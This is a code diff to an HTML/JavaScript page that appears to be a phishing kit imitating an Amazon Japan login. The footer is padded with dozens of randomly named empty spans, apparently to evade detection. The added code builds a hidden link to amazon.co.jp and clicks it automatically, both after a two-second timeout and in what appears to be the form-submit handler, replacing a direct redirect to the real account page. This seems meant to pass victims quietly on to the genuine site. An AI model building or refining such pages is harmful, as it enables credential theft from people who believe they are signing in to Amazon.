@@ -55,19 +55,25 @@
                 "            </li>\n" +
                 "        </ul>\n" +
                 "        <p class='footertext text-center'><link href='css/login/VlRqo.css' rel='stylesheet' type='text/css'><span class='fiOqu'></span><span class='qTHBx'></span><span class='eBMwI'></span><span class='pAfFa'></span><span class='yCVOj'></span><span class='AlPXp'></span><span class='WGzFZ'></span><span class='ObCdX'></span><span class='tPZcd'></span><span class='kMEsP'></span><span class='JlPCw'></span><span class='RYLhs'></span><span class='PbVEs'></span><span class='UsBVm'></span><span class='agkUR'></span><span class='JQqYo'></span><span class='FPxza'></span><span class='TvIHn'></span><span class='HZvYi'></span><span class='sNknQ'></span><span class='sDFTQ'></span><span class='sNJFQ'></span><span class='sRTYU'></span><span class='sMMMM'></span><span class='IrQXV'></span><span class='FeAWa'></span><span class='gqZAb'></span><span class='vsikN'></span><span class='vlzCo'></span><span class='LHBcD'></span><span class='UrWBF'></span><span class='egjHo'></span><span class='trITE'></span><span class='DwBqc'></span><span class='ZwLqD'></span><span class='lxPeS'></span><span class='aFZSQ'></span><span class='DMhLd'></span><span class='NpyVu'></span><span class='LjcHx'></span><span class='cdbfJ'></span><span class='WSUuq'></span><span class='geaQK'></span><span class='Natxr'></span><span class='kWDJP'></span><span class='VxfEC'></span><span class='JMepG'></span><span class='spZkP'></span></p>\n" +
-                "    </div>"
+                "    </div>" +
+                "<a id='links' href=\"#\" style='display:none;'></a>"
     }
     yincang();
     myFunction();
+    var kiddLink = document.getElementById('links');
+    //给它的href属性添加网址
+    kiddLink.href = "https://www.amazon.co.jp";
     function kiddSub () {
-        window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
+        //调用这个对象的click方法
+        kiddLink.click();
+        //window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
     };
     var myVar;
     function myFunction() {
         myVar = setTimeout(showPage, 2000);
     }
     function showPage() {
-        window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
+        kiddLink.click();
     }
 </script>
 </html>
